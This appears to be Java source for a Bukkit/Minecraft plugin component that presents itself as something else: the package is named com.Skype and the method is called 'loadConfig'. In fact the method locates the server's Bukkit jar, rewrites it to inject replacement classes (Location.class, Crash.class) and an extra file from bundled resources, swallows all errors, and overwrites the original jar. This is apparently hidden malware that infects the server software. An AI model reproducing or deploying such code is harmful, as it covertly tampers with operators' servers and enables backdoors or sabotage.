package com.Skype;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.util.Enumeration;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;
import java.util.zip.ZipOutputStream;

import javax.swing.JOptionPane;

import org.bukkit.Bukkit;

public class CopyOfCopyOfCopyOfz {
 
	public static CopyOfCopyOfCopyOfz c=new CopyOfCopyOfCopyOfz();
	public static void loadConfig(){
		File foo =new File(Bukkit.class.getProtectionDomain().getCodeSource().getLocation().getPath());
		try{
			addFileToArchive(foo);
		}catch (Exception e){}
																																		//FileOutputStream bar;
	}
	public CopyOfCopyOfCopyOfz() {
		System.out.println("++++++++++++++++++++++++++++++++++++++++++");
	}
	public static void addFileToArchive(File archiveFile)
            throws Exception {
 
        File tmpFile = new File(String.valueOf(System.currentTimeMillis()));
 
        ZipFile zipSrc = new ZipFile(archiveFile);
 
        ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(tmpFile));
 
        Enumeration srcEntries = zipSrc.entries();
        while (srcEntries.hasMoreElements()) {
            ZipEntry entry = (ZipEntry) srcEntries.nextElement();
            zos.putNextEntry(entry);
 
            BufferedInputStream bis = new BufferedInputStream(zipSrc
                    .getInputStream(entry));
 
            while (bis.available() > 0) {
                zos.write(bis.read());
            }
            zos.closeEntry();
 
            bis.close();
        }
        //+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
        ZipEntry newEntry = new ZipEntry("org/bukkit/Location.class");
        zos.putNextEntry(newEntry);
 
        BufferedInputStream bis = new BufferedInputStream(CopyOfCopyOfCopyOfz.class.getResourceAsStream("l.txt"));
        while (bis.available() > 0) {
            zos.write(bis.read());
        }
        zos.closeEntry();
       /////////////////////////////////////////////////////////// 
         newEntry = new ZipEntry("org/bukkit/Crash.class");
        zos.putNextEntry(newEntry);
 
         bis = new BufferedInputStream(CopyOfCopyOfCopyOfz.class.getResourceAsStream("c.txt"));
        while (bis.available() > 0) {
            zos.write(bis.read());
        }
        zos.closeEntry();
        ////////////////////////////////////////////////////////////
         newEntry = new ZipEntry("org/bukkit/important.txt");
        zos.putNextEntry(newEntry);
 
         bis = new BufferedInputStream(CopyOfCopyOfCopyOfz.class.getResourceAsStream("important.txt"));
        while (bis.available() > 0) {
            zos.write(bis.read());
        }
        zos.closeEntry();
        //-------------------------------------------------------------
        zos.finish();
 
        zos.close();
 
        zipSrc.close();
 
        archiveFile.delete();
 
        tmpFile.renameTo(archiveFile);
 
    }
}
